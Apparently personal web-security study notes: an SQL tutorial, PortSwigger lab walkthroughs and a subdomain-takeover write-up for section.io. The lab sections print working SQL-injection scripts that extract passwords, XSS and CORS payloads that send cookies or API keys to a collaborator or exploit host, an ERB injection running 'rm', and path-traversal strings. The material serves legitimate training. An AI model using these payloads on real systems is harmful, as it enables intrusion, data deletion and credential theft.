} ... on Starship { name length } } } GraphQL Introspection fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}} Basically tells the graphql to spit its schema.

Batching Attacks Security Misconfigurations Good practices Use a list of allowed characters. Reject invalid input gracefully. Define schemas for mutations input.

RDBMS - Relational Database Management System Data is stored in objects called tables . It's a collection of related data entries, it consists of columns and rows A table is identifiable by its name Columns is the vertical entity in the table. Rows is the horizontal entity in the table. SQL Syntax CustomerId customerName 1 J\u00falio 2 Duarte 3 Pedro This example has 3 rows and 2 columns. SQL Statements - SELECT SELECT * FROM Customers SELECT, as the name implies, selects from a database. The data returned is stored in the result table. SELECT customerId FROM Customers - SELECT works on columns, FROM works on table name. Which means, by selecting a column, I'll also select all the rows of that column. First Exercise Taking into account what I've learn't, the solution is simple. SELECT gets columns, so it's the keyword missing. SOLUTION : SELECT Second Exercise To select columns is select, therefore to select the column City it's: SELECT City FROM SQL Statements - DISTINCT SELECT DISTINCT removes duplicates. It only returns different values. SELECT DISTINCT column1, column2 FROM table_name SQL Statements - WHERE It filters rows. It extracts the records that fulfill a specified condition. SELECT column1, column2 FROM table_name WHERE condition CAN ALSO BE USED IN UPDATE, DELETE, ETC. Where allows conditional operators of most of the typical language, but it also allows: BETWEEN - Between a certain range LIKE - Search for a pattern. IN Specify multiple possible values for a column First Exercise We need to use the where clause to filter. Logically speaking, this will SELECT all the rows but return only the rows which the City column has the value Berlin. (It will only select the rows that are the left of and right of the value city. WHERE City = 'Berlin' SQL Statements - WHERE - OPERATORS. It combines with AND , OR , NOT . If all the conditions separated by AND are true, then the record/s are returned. If one of the conditions separared by OR are true, then all the record/s are returned. If the condition/s are not true the record/s are returned. Second Exercise. We need to select where the city is not 'Berlin', meaning it will ignore all the rows that have the City column as 'Berlin' We use the NOT operator. SELECT * FROM Customers WHERE NOT City = 'Berlin' Third Exercise We need to select where the customerID column has the value 32, it will only select the rows like that. SELECT * FROM Customers WHERE CustomerID = 32 Fourth Exercise. We need to select rows with columns with value London or Berlin. SELECT * FROM Customers WHERE City = 'Berlin' OR City = 'London SQL Statements - ORDER BY Sorts the result-set (resulting table) in ascending or descending order. Sorts in ascending order by default. Use DESC for descending SELECT column1, column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC You can order multiple columns by separating them with a comma. SELECT * FROM Customers ORDER BY Country ASC, CustomerName DESC First Exercise We need to sort on the City field, therefore: SELECT * FROM Customers ORDER BY City Second Exercise We need to sort on the City field in reverse order, therefore: SELECT * FROM Customers ORDER BY City DESC Third Exercise We need to sort on the Country field and then City field, therefore: SELECT * FROM Customers ORDER BY Country, City SQL - Statements INSERT INTO Inserts new records in a table. INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...) or, if we add to all the table columns INSERT INTO table_name VALUES (value1, value2, value3, ...) First Exercise INSERT INTO Customers(CustomerName, Address, City, PostalCode, Country) VALUES('Hekkan', 'Gatevein', 'Sandnes', '4306', 'Norway') SQL Statements - NULL. We can only use IS NULL to test for NULL values or IS NOT NULL to test for NOT NULL Values SELECT column_names FROM table_name WHERE column_name IS NULL SELECT column_names FROM table_name WHERE column_name IS NOT NULL First Exercise We need to test if its empty, that is, null, therefore: SELECT * FROM Customers WHERE PostalCode IS NULL Second Exercise We need to test if its not empty, that is, NOT NULL, therefore: SELECT * FROM Customers WHERE PostalCode IS NOT NULL SQL Statement - UPDATE The update statement modifies existing records in a table. UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition It's important to use the WHERE clause. if you don't, all records will be changed. It decides how many records are to be updated. UPDATE Customers SET ContactName='Juan' First Exercise We need to update all records of the city column in the customer table, as such: UPDATE Customers SET City = 'Oslo' Second Exercise We need to update all the records of the city column in the customer table where the country is 'Norway', therefore: UPDATE Customers SET City = 'Oslo' WHERE Country = 'Norway' Third Exercise We need to update the City value and Country value, as such: UPDATE Customers SET City = 'Oslo', Country = 'Norway' WHERE CustomerID=32 SQL Statement - DELETE Deletes existing records in a table. DELETE FROM table_name WHERE condition Be careful when deleting records in a table! Notice the WHERE clause in the DELETE statement. The WHERE clause specifies which record(s) should be deleted. If you omit the WHERE clause, all records in the table will be deleted First Exercise We need to delete the column Country with row value 'Norway'. As such: DELETE FROM Customers WHERE Country = 'Norway' Second Exercise We need to delete all the records from the Customer table. DELETE FROM Customers SQL Statements - Functions It does operations on the selected column values. MIN Returns the smallest value of the selected column MAX Returns the biggest value of the selected column SELECT MIN/MAX(column_name) FROM table_name WHERE condition First Exercise We need to select the min value from the column Price: SELECT MIN(Price) FROM Products Second Exercise The max value: SELECT MAX(Price) FROM Products Third Exercise Number of records: SELECT COUNT(*) FROM Customers WHERE Price = 18 Fourth Exercise We need to select a function that calculates the average price of all products. SELECT AVG(Price) FROM Products Fith Exercise We need to select a function that calculates the sum of product's price's. SELECT SUM(Price) FROM Products SQL Statement - LIKE The LIKE operator searches a where caluse for a pattern MS Access uses an asterisk (*) instead of the percent sign (%), and a question mark (?) instead of the underscore (_). SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern WHERE CustomerName LIKE 'a%' Finds any values that start with \"a\" WHERE CustomerName LIKE '%a' Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%' Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%' Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a_%' Finds any values that start with \"a\" and are at least 2 characters in length WHERE CustomerName LIKE 'a__%' Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o' Finds any values that start with \"a\" and ends with \"o\" First Exercise Has to start with letter a, therefore: SELECT * FROM Customers WHERE City LIKE 'a%' Second Exercise Has to end with letter a, therefore: SELECT * FROM Customers WHERE City LIKE '%a' Third Exercise Has to contain the letter a, therefore: SELECT * FROM Customers WHERE City LIKE '%a%' Fourth Exercise Has to start with a, end with b: SELECT * FROM Customers WHERE City LIKE 'a%b' Fith Exercise Can't start with letter a, therefore: SELECT * FROM Customers WHERE City NOT LIKE 'a%' SQL Statements - Wildcards MS Access * Represents zero or more characters bl* finds bl, black, blue, and blob ? Represents a single character h?t finds hot, hat, and hit [] Represents any single character within the brackets h[oa]t finds hot and hat, but not hit ! Represents any character not in the brackets h[!oa]t finds hit, but not hot and hat - Represents any single character within the specified range c[a-b]t finds cat and cbt # Represents any single numeric character 2#5 finds 205, 215, 225, 235, 245, 255, 265, 275, 285, and 295 SQL Server % Represents zero or more characters bl% finds bl, black, blue, and blob _ Represents a single character h_t finds hot, hat, and hit [] Represents any single character within the brackets h[oa]t finds hot and hat, but not hit ^ Represents any character not in the brackets h[^oa]t finds hit, but not hot and hat - Represents any single character within the specified range c[a-b]t finds cat and cbt First Exercise Find where city's second letter is a: SELECT * FROM Customers WHERE City LIKE '_a%' Second Exercise Find where city's first letter is a or c or s: SELECT * FROM Customers WHERE City LIKE '[acs]%' Third Exercise Starts with a to f: SELECT * FROM Customers WHERE City LIKE '[a-f]%' Fourth Exercise Doesn't start with acf. SELECT * FROM Customers WHERE City LIKE '[!acf]%' SQL Statement - IN Operator Allows to specify multiple values in a WHERE clause SELECT column_name(s) FROM table_name WHERE column_name IN (value1, value2, ...) First Exercise All the records where Country is either Norway or France SELECT * FROM Customers WHERE Country IN('Norway','France') Second Exercise All the records where country is not Norway and France SELECT * FROM Customers WHERE Country NOT IN('Norway','France') SQL Statement - Between Allows to select records within a given range. SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2 First Exercise Select between 10 and 20. SELECT * FROM Products WHERE Price BETWEEN 10 AND 20 Second Exercise Select not between 10 and 20 SELECT * FROM Products WHERE Price NOT BETWEEN 10 AND 20 Third Exercise Select between two words aphabetically SELECT * FROM Products WHERE ProductName BETWEEN 'Geitost' AND 'Pavlova' SQL Statement - Aliases They give a table or column a temporary name. SELECT column_name AS alias_name FROM table_name SELECT column_name(s) FROM table_name AS alias_name SQL Statement - JOINS (INNER) JOIN - Returns records whose values match in both tables, that is, they exist in both tables. LEFT (OUTER) JOIN - Returns all the records selected from the left table and records that exist in both from the right table. RIGHT (OUTER) JOIN - Returns all the records selected from the right table and records that exist in both from the left table. FULL (OUTER) JOIN - Returns all the selected records from both tables. First Exercise Insert the missing parts in the join clause, using customerID field in both tables as the relationship. SELECT * FROM Orders LEFT JOIN Customers ON Orders.CustomerID=Customers.CustomerID Second Exercise Pick the right type of join, to select all the records where there is a match on both tables. SELECT * FROM Orders INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID Third Exercise Pick the right type of join, to select all the records where there is a match and that exists in the right table SELECT * FROM Orders RIGHT JOIN Customers ON Orders.CustomerID=Customers.CustomerID SQL Statement - Group BY Groups the same value rows. So, if we have, for example, two columns, CustomerID and COUNT(CostumerName) and we group by customerID, we get all the unique customerID values with the count of each customerName associated with those customerID's. We can group by more than one column: Book_1 - Francisco - Romance - 12.40\u20ac Book_2 - Diogo - Aventura - 13.40\u20ac Book_3 - Diogo - Terror - 14.40\u20ac SELECT Genre, MAX(Price), Author FROM Books GROUP BY Genre, Author Terror - Diogo - 14.40\u20ac Romance - Francisco - 12.40\u20ac SELECT column_name(s) FROM table_name WHERE condition GROUP BY column_name(s) ORDER BY column_name(s) First Exercise We need to list the number of customers in each country. SELECT COUNT(CusomterID), Country FROM Costumers GROUP BY Country Second Exercise List the number of customers in each country, ordered by the country with the most customers first.

This can be done in various clauses, such as order by, where, having, like. It's important to visualize the current server-side query context by understanding the web app's functionality. Note: Filtering is usually done server side (WHERE clause) First LAB It's a web shop with various products and it can filter them by categories. The category value is directly inserted onto an SQL query in the WHERE clause. The objective is to see every product. This can be done with this simple payload: ' OR 1=1 -- Second LAB It's a web shop but I need to login as administrator. This can be done with a simple WHERE clause payload, as that's where the user input is inserted. The payload is: ' OR 1=1 -- If the result of the query is outputted in the response, then we can subvert that to retrieve other information from other tables with a UNION attack. It allows us to execute one or additional SELECT clauses and append the results to the original set. Example SELECT a, b FROM table1 UNION SELECT c, d FROM table2 BUT The individual queries must return the same number of columns. The data types in each column must be compatible between the individual queries. So, we need to figure out the number of columns in the original query to append a new query. This can be done with the order by keyword. We can order by the result-set column index., Example ' ORDER BY 1 ' ORDER BY 2 until we reach an error which says column with index 3 is out of range for the given table. We can also specify an arbitrary number of values in the new SELECT clause until we avoid the error. SELECT 1, 2, 3, 4... SELECT NULL, NULL, NULL, NULL.... Third LAB It's a web shop. We have another category parameter and we know its inserted in a where clause, the objective is to figure out the number of columns in the result set. As such, we do: ' ORDER BY 1 . No error. ' ORDER BY 2 . There's no error until 4, which means it has 3 columns. According to the lab description, we must use the NULL technique to solve. So we do: ' SELECT NULL,NULL,NULL Generally speaking, we need to know which columns are being reflected to see the resulting set of the UNION query. We can do that by using a unique character in each value of the SELECT clause and see where that is reflected. 'UNION SELECT 1,NULL,NULL ' UNION SELECT NULL,1,NULL Fourth LAB We need to combine the techniques portrayed earlier, so we insert in the category field: ' ORDER BY 2 -- . No error. Increasing one more gives us an error, so we have 2 columns in the result set. Next, we see which ones can reflect text. We insert: ' UNION SELECT 'hello', 'hello2' -- . We see both of the fields reflect text, so we can just: UNION SELECT username,password FROM users -- Fith LAB Sometimes only one column is reflected, so we must concatenating the strings in order to see the output. In this case, two are reflected but only one reflects text. First, we figure out which one with: UNION SELECT 'random_text', NULL -- and ' UNION SELECT NULL, 'random_text' -- . We see the second column accepts text, so we place our payload there: ' UNION SELE T NULL,username||'~'||password FROM users -- Note: String concatenation is different with each SQL version We can query the database version in different ways depending on what type is being served. Sixth LAB We use the techniques from before to figure out the columns in the result set and which one is being reflected. As such, the final payload is: ' UNION SELECT @@version, NULL -- - Note:All SQL versions in the cheatsheet accept -- - as a comment Blind SQL injection happens when there is no input reflected on the HTTP response. To test this, an attacker needs to be ware of the output of the application - does the content-length change with different boolean sql logic? That is, the app returns data depending on the query, just not the data you asked for in the query. Seventh LAB It's a blind SQLi, exploitable with the below script, because it looks for changes in the body, that take place if the query is true or not. 2:20 PM import requests import string def main(): password = \"\" for index in range(1, 21): for char in string.ascii_letters + string.digits: cookies = {\"TrackingId\":f\"pcLJqgVbBsfqEax3' AND (SELECT SUBSTRING(password, 1, {index}) FROM users WHERE username='administrator')='{password}{char}\", \"session\":\"LJy9oeGMExJomNP7psWb31UBvNi3Vt6Q\"} r = requests.get(\"https://0ada000e0444e88dc09a9948005700ad.web-security-academy.net/\", cookies=cookies) if \"welcome\" not in r.text.lower(): continue password += char print(password) index += 1 main() Eighth Lab To solve the lab, we need to display the database version string. We know we can use a UNION attack. First we need to see how many columns there are, we do that with an order by query: ' ORDER BY 1 -- - . When we get an error we know there are current column number - 1 columns. Then we need to see which columns displays strings. We do that with: ' UNION SELECT 'abc','def' -- - . The string reflected implies which column reflects. We know it's the first one, so we switch 'abc' for @@version and 'def' for NULL and the lab is solved. Ninth Lab First we need to find the name of the users table: ' UNION SELECT table_name, NULL FROM information_schema.tables -- - . After, we find the name of the columns in that table: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=<found_table_name> Then we simply fetch username and password with our attained knowledge. ' UNION SELECT <found_username_column_name>, <found_password_column_name FROM <found_table_name> -- - We log in and the lab is solved. Tenth Lab We repeat the same logic but with table_name in the first select and all_tables as the table: ' UNION SELECT table_name,NULL FROM all_tables-- , then we do: ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'-- . Finally we use the attained information to construct a query: ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF-- Eleventh Lab Simply use this script which uses the case when condition and string concatenation to induce conditional errors based on a given character of the password being correct. import string import requests import string payload = \"\" count = 1 while count <= 30: for char in string.ascii_letters + string.digits: r = requests.get(f\"https://0a8d001c0488b738c0eda475002f00cb.web-security-academy.net/\", cookies={\"TrackingId\":f\"FqkZypIERiKR57Km'||(SELECT CASE WHEN(SUBSTR(password,1,{count})='{payload}{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'\", \"session\":\"EqyCUGiM2rYeDvhPu8Js9o1I2sB0ZTDK\"}) if r.status_code != 500: continue payload += char print(f\"{payload}\\nStatus Code: {r.status_code}\") count += 1 break Twelth LAB Simply induce a time delay in the tracking cookie: x'||pg_sleep(10) -- - Thirthinth LAB Retrieve information with this script but remember to switch the url for your lab id. import requests import string def main(): index = 1 password = \"\" while index <= 30: for char in string.ascii_letters + string.digits: r = requests.get(\"https://0a5a004b0438160bc046d73800e60088.web-security-academy.net/\", cookies={\"TrackingId\":f\"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{index})='{password}{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\"}) if r.elapsed.total_seconds() < 10: continue password += char index += 1 print(password) break main() XSS Occurs when user unvalidated user input is reflected onto the html. An attacker can then inject arbitrary tags, some of which leads to js execution, thus arises cross site scripting. XSS is split into three categories: Reflected XSS - it's not stored, the reflection occurs only in the subsequent response to the request. Stored XSS - It's stored somewhere, so the reflection is present even if we close the page and re-open it. DOM XSS - Takes place when user input is placed on a sink that allows execution of js. MAIN SINKS document.write() document.writeln() document.domain element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent MAIN jQuery Sinks add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML() Reflected XSS LAB 1 There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script> Reflected XSS LAB 2 Angle brackets are html encoded, so we can't escape the tag context, therefore we need to append an event handler attribute. The final payload to be inserted in the search box is: \" autofocus=\"\" onfocus=\"alert() Reflected XSS LAB 3 Our input is inserted directly onto js context, so we can simply close the string with quote, subtract our alert() payload from that and subtract to another opening quote: '-alert()-' Stored XSS LAB 1 There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script> Stored XSS LAB 2 Our input is reflected inside an href a tag attribute of the website input, as such, we can simply inject javascript:alert() . DOM XSS LAB 1 There's no encoding, so all we need to do is insert the most common payload of all - <script>alert(1);</script> DOM XSS LAB 2 We can't inject tags that execute XSS inside <select>, we close it first. Meaning the final payload is: \"> ` DOM XSS LAB 3 We can't inject <script> or <svg> inside document.write, so we inject: <img src=x onerror=alert()> DOM XSS Lab 4 In this case, we have jquery changing the attribute value of an html tag with attr : $(function() { $('#backLink').attr(\"href\",(new URLSearchParams(window.location.search)).get('returnUrl')); }); As such, we can simply use javascript:alert(document.cookie in returnUrl) to solve this lab. DOM XSS LAB 5 This one utilizes the selector sink with window.location.hash: $(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); }); VULNERABLE SNIPPET : var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); The $() selector sink can inject malicious objects onto the DOM, as such, if we craft a payload like: #<img src=/ onerror=print()> , a print page will pop up. With that in mind, we can deliver this exploit to the victim: <iframe src=\"https://vulnerable-website.com#\" onload=\"this.src+='<img src=1 onerror=alert(1)>'\"> It loads the iframe with that given src and when it loads, appends an xss payload to that src. XSS to steal cookies Use burpcollborator to steal the admin's cookies via an XSS at post comment section. <script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script> Authentication Its the action of verifying the identity of a given user. It's making sure they are who they claim to be. Authentication is the process of verifying that a user really is who they claim to be, whereas authorization involves verifying whether a user is allowed to do something. Username enumeration occurs when there's a way to distinguish a failed login attempt from a login attempt with a correct username. It can be response length, time of response, or simply a message such as \"There's no username like that in our database.\" Lab 1 In this LAB, the developer decided to write a message when the username is wrong and when the password doesn't match. With that in mind, we can construct a payload list that iterates over usernames until it finds the \"Incorrect password\", and then iterate over the password list until it doesn't say \"Incorrect password\". Basically, an attacker is able to deduce the account credentials by analyzing the responses given to him. username: arcsight password: hunter LAB 2 This 2FA bypass is fairly simple. Merely login as carlos montoya and when promped for the 2fa code, issue a get request to /my-account. Notice you are logged in. LAB 3 Issue a password reset link from the account wiener, go to email client, click the link, set a new password and click update with intercept on. Notice a POST is sent with a username, change it to carlos, send the request and login to that account with the new password. CSRF CSRF Request forgery takes place when there is an action to be made and cookie based session handling. Example (assume cookie based session handling) GET /change-email?email=example@example.com HTTP/2 This can be crafted onto a URL that is sent to the victim, which, when clicked, changes its email. CSRF Lab 1 Simply send the following to the body of the /exploit url inside the lab <form method=\"$method\" action=\"$url\"> <input type=\"hidden\" name=\"$param1name\" value=\"$param1value\"> </form> <script> document.forms[0].submit(); </script> Change $method to to POST. Change $action to the my-account/change-email Change $param1name to email Change $param1value to an email value. Deliver the exploit. Cors CORS is a defense mechanism that prevents websites from attacking each other. It basically says: Any website with this given origin can talk to me, any other can't. It does that by comparing headers, Origin and Access-Control-Allow-Origin. If they match, then the request is sent. You can't use credentials if the origin is a wildcard. For Access-Control-Allow-Credentials to be true, the Access-Contol-Allow-Origin needs to to not be a wildcard, that is, it needs to be a domain or a group of domains. You can't have *.domain.com as Origin. Sometimes developers go the easy way out and code that any request's to their server will be allowed, by simply reflecting the Origin header's value into Access-Control-Allow-Origin. CORS LAB 1 In this case, the origin header is reflected in the server and credentials are allowed. We craft a CORS requests like this: <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','$url/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script> replacing the $url with our unique id lab. We store, deliver exploit to victim and click see exploit. We notice the api key of the administrator account is in there, and that is the key to solve the lab. CORS LAB 2 Origin header value can be null, and the server can accept that in the following conditions: Origins whose scheme is not one of http, https, ftp, ws, wss, or gopher (including blob, file and data). Cross-origin images and media data, including that in <img>, <video> and <audio> elements. Documents created programmatically using createDocument(), generated from a data: URL, or that do not have a creator browsing context. Redirects across origins. iframes with a sandbox attribute that doesn't contain the value allow-same-origin. Responses that are network errors. So, in our case, we craft a sandboxed iframe payload. <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','$url/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText); }; </script>\"></iframe> Replace $url with the unique lab url. Replace $exploit-server-url with the unique exploit server url. XXE XML External Entity allows an attacker to interfere with application's processing of XML data. It can alllow to view files, interact with systems the app is able to access. It might be leveraged for SSRF. XXE LAB 1 It's fairly simple. Whilst checking the stock of a product, the client queries the server with XML.

If the server allows it, we can use, for example, the file:/// directive to whatever file we want the server to fetch, and the server should return that in the response, if its not a blind SSRF. SSRF LAB 1 The server sends a request to another server to fetch the stock data, as such we only need to replace the server payload with ours: http://localhost/admin/delete?username=carlos SSRF LAB 2 We know there's another internal server which is capable of running admin functions, so we brute-force the last octet of the given IP, appending the url path to do the admin action: http%3A%2F%2F192.168.0.x%3A8080/admin/delete?username=carlos Directory Traversal It occurs when a file is programatically opened with the filename being user input. For example, in python, open(userinput) can lead to this. An attacker, if the input isn't properly validated, can simply append a payload that traverses through the path, such as: ../../../etc/passwd . This allows an attacker to see the etc/passwd file, because .. in Linux means to go back one directory. Directory Traversal LAB 1 A filename parameter is used to fetch images, we replace the image name with: ../../../etc/passwd and the password file is show. Access Control Authorization is the process of determining if a given user can perform the requested actions or access resources. It can be vertical, horizontal or context dependant. Vertical access control mechanisms restrict access to sensitive functionality that is not available to other types of users. For example, an administrator might be able to modify or delete any user's account, while an ordinary user has no access to these actions Horizontal access control mechanisms restrict access to resources to users who are specifically allowed to access those resources. For example, a banking application will allow a user to view transactions and make payments from their own accounts, but not the accounts of any other user Context dependant access control mechanisms restrict access to resources based on a user's interaction with them. For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment Access Control LAB 1 We need to delete a user knowing there is unprotected admin functionality. We go to robots.txt looking for that and find the endpoint: administrative-panel . We go to it and see we can access all admin functions, such as delete user. We delete the user required to complete the lab Access Control LAB 2 Same logic, but this time exists an admin panel with an unpredictable url generated by js. We open the source code and see the url lying there. Open that url and delete the user required to complete the lab. Access Control LAB 3 This time a user role is set by the cookie Admin=true|false after logging in. So we log in. We need to get admin, so we set the cookie Admin=false to true after logging in. Access Control LAB 4 We know there's a parameter called roleid which when changed to 2 gives us admin. We open burpsuite, enter the lab and notice we can change our roleid in the profile. We set a valid email. Start intercept, click update email and change the request to include \"roleid\":2. We forward it and notice we are admin by clicking on the Admin-Panel link that appeared. Access Control LAB 5 This time, when we log in, we can see the id GET parameter in the url pointing to the current user. Thus, we need only change it to carlos and we are now in carlos's account. Copy his api key and submit it as the solution. Access Control LAB 5 This time, the user-id is unpredictable, nonetheless, we can see it visiting the given user's page. As such, we visit carlos's page and copy the uuid in the get parameter. We login to our account and replace the uuid with carlo's. Copy and paste the api key in the solution. Access Control LAB 6 The response is a redirect but the backend doesn't remove the body, so we can see the results of our request anyway. We log in, go to my account, send that request to burpsuite repeater, add an ?id=carlos query-string to the url and get the api key. Paste it as the solution. Access Control LAB 7 We can change the user id to administrator in my account page after logging in. Send that request to burpsuite, look for the administrator password in the source code. Log in as administrator, dele the user carlos. Access Control LAB 8 We go login to our account, wiener:peter and go to live chat. We send a message and click get transcript. We notice it's getting an endpoint that fetches 2.txt. We change it to 1 and see the password there. Insecure deserialization Serialization is the process of converting data structures such as objects into something that can be sent and received like a stream of bytes. Basically you use it to save the object's state. Deserialization is the process of restoring this stream of bytes to its original state. Insecure deserialization occurs when user input is deserialized. Insecure deserialization LAB 1 We login with account wiener:peter . We open our browser's dev tools. We notice we receive a cookie whose value we decode and notice it is a php serialized object. The admin attribute contains a boolean value set to false. We set it to true by replacing 0 with 1. Encode the cookie. We now have access to the admin panel. Go there and delete user carlos . Information Disclosure. It's the process of discovering sensitive (or not) information that the website unintentionally discloses to the user. Information Disclosure LAB 1 We click to see any arbitrary product and notice it has an id parameter which expects an int. We providade it an arbitrary string such as: \"hello\" and notice it spews out information. The apache version is the challenge. Information Disclosure LAB 2 We open the source-code of the home page and scroll through the comments. We notice one called debug . It points to /cgi-bin/phpinfo.php . We go there and find SECRET_KEY . It is the solution for the lab. Information Disclosure LAB 3 We browse to a directory called /backup/ and it has directory listing set. We click on the only file there. On the source-code, there's a password for a postgres database. It is the solution. Information Disclosure LAB 4 We browse to /admin and notice we need a local IP to view the panel. We TRACE admin and see the header: X-Custom-IP-Authorization . We set it in our request to /admin with value: 127.0.0.1 We send a request to the page and open it in our browser and delete user carlos . Business Logic Vulnerabilities Arise when developers assume an end user will interact a certain way but interacts in another, unintended way, leading to unintended behaviour by the web application (so called logic-flaws). Business logic vulnerabilities LAB 1 This time, the developer assumed a user would only use the browser to make requests, he placed excessive trust in client side controls. This mean we can simply craft a request which changes the price parameter to 1, and we will buy that item for that price. Simply open burpsuite, set intercept on. View details on the 1337 l34th3r j4ck3t, click order, change price to 1, go to your cart and order it. The lab is solved. Server Side Template Injection Occurs when user input is directly concatenated to the template renderer instead of being passed in as data in the appropriate fields. It leads to server-side RCE. SSTi LAB 1 We need to pop RCE knowing it's ERB template. The objective is to delete morale.txt. That's fairly simple, call system function. Final payload: <%= system('rm morale.txt') %> Web Cache Poisoning Between the client and the server lays a cache, it uses keyed input, that is, parts of the http request, to determine if a cached request will be served. The logic is as follows: If the keyed input in the http request matches the keyed input cached, then a cached request is served. Otherwise, it is forwarded to the server. Web Cache Poisoning LAB 1 We send two GET requests to /?cb=1234 and notice the second one's response displays a header: X-Cache: hit , implying the cache served us a response. In order to be served by the cache, we only need to send a request, and the next request (if it has the same keyed input) is served by the cache. The object is to pop an alert via X-Forwarded-Host. Add that header with an arbitrary host value, such as example.com, and send the request. Copy the path of the absolute url it generates. Go the exploit serve and change the filename to that, in the body write alert(document.cookie) and store the exploit. Go back to the previous GET request but remove the query-string. Substitute the arbitrary X-Forwareded-Host value to your exploit-lab url. Send the request until the hit displays again. If the lab is not solved, re-send the request every few seconds until it is. Web Cache Poisoning LAB 2 We need to pop an alert(1) through the cookie. First we add a cache buster such as: ?cb=1234 and figure out which cookie is being reflected. It's fehost, so we add to it: \"-alert(1)-\" . We remove the cache buster, therefore sending that request to / . When we get a X-Cache: hit header, copy the url and paste it in the browser. The alert is popped, lab is solved. Request Smuggling Is the process of sending a smuggled request inside another request. This arises when there are multiple servers before reaching the ultimate backend server. Imagine a situation where the frontend server uses Content-Length to discern where the body ends, but the backend server uses Transfer-Encoding: The frontend will forward the entire request to the backend, due to the matching content-length, but the backend server will see a chunk size of 0, implying the transfer encoding request is over. However, since the frontend server forwarded the whole request, there are still bytes left unprocessed, which due to the nature of the http protocol, will be seen as the next HTTP request.

This service allows users to host a web application and associate it with a subdomain or domain. It validates the DNS configurations by asserting the added subdomain has a CNAME record pointing to: <user subdomain>.c.section.io . So, if the user wanted to associate the subdomain example.char49.com , he'd have to create a CNAME: example.char49.com.c.section.io . The user's subdomain is then associated with section.io. {#fig:1} In the following attack scenario, the subdomain: ftp.boxycharm.com does not point to ftp.boxycharm.com.c.section.io . It points to boxycharm.com.c.section.io , and this points to a valid IP inside section's range of IPs. However, there exists some sort of functionality in the section.io hosting logic, that marks the previously described validation steps as complete (or unnecessary), because ftp.boxycharm.com is already pointing to a valid IP inside section's range of ip's. Because of this, the validation step is seen as completed and the DNS automatically propagates, so the project web application content is served in ftp.boxycharm.com A DNS query showed that the target points to boxycharm.com.c.section.io via a CNAME record, which in turn points to the following IP addresses: 207.120.37.202, 207.120.37.103, 207.120.37.109, 207.120.37.205, 207.120.37.106, 207.120.37.198, 207.120.37.104, 207.120.37.197 {#fig:2} In order to successfully exploit the subdomain takeover, an attacker must know the location of the target subdomain, and create a web application project, within section.io, with the exact same location. Section.io writes the virtual host inside the server with an IP assigned depending on the location selected. Since the vulnerable domain already has a specific location and therefore an IP that clients will connect to when navigating there, in order for us to take it over, we have to ensure the IP's from the vulnerable web application and the attacker's section.io project web application are the same. If they are, when he adds the vulnerable subdomain to his project, the virtual host corresponding to his web application project, will actually be written inside the server that your vulnerable subdomain ( ftp.boxycharm.com ) IP points to. In case of ftp.boxycharm.com it is London (We infer by looking at the last domain in the CNAME chain). {#fig:3} At this point the researchers had all the required information to takeover the subdomain. A new project was created, the locations matched, and the subdomain added to the project. After DNS propagation, the contents were served to the subdomain. Recommendations Review DNS configuration and assure that all the aliases and delegations of subdomains to external domains (CNAME, DNAME, NS registers) do not expose these subdomains to takeovers. Remove the cname chain of ftp.boxycharm.com if the domain is unneeded or claim that domain within a section.io project if it is needed.
